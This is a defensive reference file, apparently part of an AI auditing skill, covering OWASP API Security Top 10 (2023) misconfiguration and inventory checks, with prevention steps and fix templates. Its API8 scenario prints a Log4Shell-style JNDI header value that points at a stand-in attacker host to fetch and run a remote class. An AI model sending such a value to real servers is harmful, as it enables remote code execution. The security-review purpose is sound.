# Infra Checks — OWASP API Security Top 10 (2023)

Full detail for the two categories that require reading **config, deployment, gateway, and documentation** artifacts — not just route handlers. Disclosed reference for [`owasp-api-top-10-2023`](SKILL.md); loaded **only when the infra branch fires** (the repo ships containers, IaC, platform/gateway config, or API specs).

Each category is co-located: factors, the artifacts to inspect, a trimmed scenario, prevention, the proposed-fix shape, and the CWE. The single-line signal for each lives in `SKILL.md`; this file owns the depth.

Source: [OWASP API Security Top 10 — 2023 edition](https://owasp.org/API-Security/editions/2023/en/0x00-toc/).

> **Cross-reference with code.** API4 (Unrestricted Resource Consumption) also has code-level controls — those live in `CODE-CHECKS.md`. API8 here owns the gateway/middleware/TLS/headers side of rate-limiting and hardening, so the two files split cleanly by tier with no duplication.

---

## API8:2023 — Security Misconfiguration

**Factors.** Exploitability _Easy_ · Prevalence _Widespread_ · Detectability _Easy_ · Impact _Severe_. Misconfiguration spans the **whole API stack** — network, host, container, gateway, framework, app. Can leak user data and expose enough system detail to compromise the server.

**Inspect these artifacts.**

- **TLS / transport:** plaintext API traffic, disabled or weak TLS, mixed content, certs not pinned to a CA. Look in server/gateway config and outbound client config.
- **CORS:** missing or permissive policy (`Access-Control-Allow-Origin: *` with credentials, reflected origin, `Allow-Credentials: true` everywhere) — in framework middleware, gateway config, or `vercel.json`/`wrangler` headers.
- **Security headers:** absent `Cache-Control`/`Content-Type`/CSP/HSTS/X-Frame-Options on responses (see [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)); private responses cacheable by browsers/proxies.
- **Error verbosity:** stack traces, internal paths, or exception details returned to clients (`debug: true` in prod, `app.debug`, verbose error middleware).
- **Default/insecure config & default credentials:** unchanged defaults, default admin creds, unnecessary features/HTTP verbs enabled (e.g. `HEAD`/`TRACE`), unnecessary services running.
- **Patching:** unpatched frameworks/libs with known CVEs — the Log4Shell-style scenario below is misconfiguration of a default-on feature; check `npm audit`/`pip-audit`/`go vuln`/SBOM and whether vuln components are reachable.
- **HTTP server-chain consistency:** load balancer / reverse proxy / back-end process requests differently → request-smuggling / desync (CWE-444).
- **Outbound policy:** permissive egress that lets a misconfigured component phone home (the Log4Shell example again — JNDI lookup reaches `attacker.com`).
- **Cloud/storage permissions:** S3 bucket / object-store / cloud-resource permissions too broad; secrets in `.env`/config committed or world-readable.

**Scenario.** A logging utility with placeholder expansion + JNDI lookup enabled by default writes `<method> <api_version>/<path> - <status>` per request; an attacker sends `X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}`, the default-on expansion plus permissive egress pulls and executes the malicious class. Or a DM API omits `Cache-Control`, so private conversations land in the browser cache.

**Prevent.**

- A repeatable hardening process → fast, locked-down deployments; a task to review **and update** configs across the whole stack (orchestration, components, cloud); automated continuous assessment of config in all environments.
- Enforce TLS on all API comms (client→server and upstream/downstream), internal or public.
- Be specific about allowed HTTP verbs; disable the rest.
- Browser-facing APIs: proper CORS + applicable security headers.
- Restrict incoming content types/formats to what the business needs; enforce response schemas **including errors** to suppress traces.
- Keep the whole HTTP chain uniform to avoid desync.

**Proposed-fix shape.** "At `<config>:<line>`, set `Access-Control-Allow-Origin` to the specific allowlist (not `*`) and drop credentials where unneeded. Add security headers (HSTS, CSP, `Cache-Control: no-store` for private responses). Set `debug:false`/remove verbose error middleware in prod. Tighten storage permissions and rotate the secret in `.env`. Disable unused verbs; align LB/proxy/back-end request parsing. Patch <component> (CVE-…) or remove it."

**Refs.** [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/) · [Configuration & Deployment Testing — WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README) · CWE-2 (Environmental Security Flaws) · CWE-16 (Configuration) · CWE-209 (Error Message with Sensitive Info) · CWE-319 (Cleartext Transmission) · CWE-444 (HTTP Request Smuggling) · CWE-942 (Permissive Cross-domain Policy)

---

## API9:2023 — Improper Inventory Management

**Factors.** Exploitability _Easy_ · Prevalence _Widespread_ · Detectability _Average_ · Impact _Moderate/Business-specific_. Attackers get in through **old API versions**, stale/deprecated endpoints, or shadow hosts left running with weaker security. Outdated docs make vulns hard to find and fix. Sensitive data shared with third parties without justification or visibility widens the blast radius.

Two blindspots OWASP names explicitly: a **documentation blindspot** (purpose/host/version/access unclear; no docs or stale docs; no retirement plan; missing host inventory) and a **data-flow blindspot** (sensitive data shared with a third party with no business justification, no inventory, or no visibility of which sensitive data flows).

**Inspect these artifacts.**

- **API versioning & retirement:** multiple versions deployed (`/v1`, `/v2`, `/beta`); old/deprecated versions still alive and reachable, possibly connected to the **production** database; no retirement plan or backport/force-migrate decision for security fixes.
- **Host inventory & environments:** staging/test/dev/beta hosts exposed publicly when they should be internal/partner-only; production data used on non-production deployments (which then lack prod-grade security — the rate-limit-bypass scenario); unclear or undocumented hosts.
- **Documentation accuracy:** OpenAPI/Swagger spec drift from reality — undocumented endpoints ("shadow APIs"), stale param/response schemas, missing docs for auth/errors/redirects/rate-limit/CORS. CI not regenerating docs from code.
- **Access to docs/specs:** API documentation/explorer (Swagger UI) exposed to the public when it should be auth-gated.
- **Third-party / data-flow inventory:** which third parties receive sensitive data, what type, with what business justification/approval; monitoring of those flows (the 50M-user leak scenario).
- **Per-version protection:** a WAF/API-gateway/limiting policy covering **all exposed versions**, not just current prod.

**Scenario.** Rate-limiting on password-reset lives in a component in front of the official API (`api.socialnetwork.owasp.org`); a researcher finds `beta.api.socialnetwork.owasp.org` running the **same** API but **without** the rate-limiting component — and brute-forces the 6-digit reset token on any user. Or a social net shares user data with integrated apps without enough restriction/monitoring; a malicious app consents 270k users but exfiltrates 50M users' private data via friends-graph over-sharing.

**Prevent.**

- Inventory every API host: environment (prod/staging/test/dev), intended network access (public/internal/partners), version. Inventory integrated services: role, data exchanged, sensitivity.
- Document all API aspects (auth, errors, redirects, rate-limit, CORS, endpoints + params/requests/responses); auto-generate from open standards in CI; gate docs to authorized users.
- Apply API-security protection to **all exposed versions**, not just current prod.
- Don't run production data on non-prod deployments; if unavoidable, give them prod-grade security.
- When a newer version adds security improvements, do a risk analysis: backport vs. force-migrate the old version off.

**Proposed-fix shape.** "Decommission the unprotected `beta.*`/`/v1` host (or bring it under the same gateway/WAF/rate-limit policy as prod). Reconcile the OpenAPI spec against actual routes and remove/retire shadow endpoints; regenerate the spec in CI and gate the explorer behind auth. Inventory and justify each sensitive third-party data flow; add monitoring. Document a retirement plan and a backport/force-migrate decision for each superseded version."

**Refs.** CWE-1059 (Incomplete Documentation) · [OWASP API Security Top 10 — 2023 edition](https://owasp.org/API-Security/editions/2023/en/0x00-toc/)
